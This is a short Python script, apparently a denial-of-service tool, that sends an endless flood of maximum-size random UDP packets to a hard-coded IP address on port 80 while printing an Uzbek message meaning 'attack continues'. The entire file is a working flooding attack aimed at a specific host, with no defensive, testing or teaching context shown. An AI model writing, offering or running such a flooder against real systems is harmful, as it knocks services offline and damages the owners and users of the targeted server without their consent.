import socket
import random

ip = "165.22.22.196"  
port = 80
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

while True:
    bytes_to_send = random._urandom(65507)
    sock.sendto(bytes_to_send, (ip, port))
    print(f"Hujum davom etmoqda: {ip}:{port}")
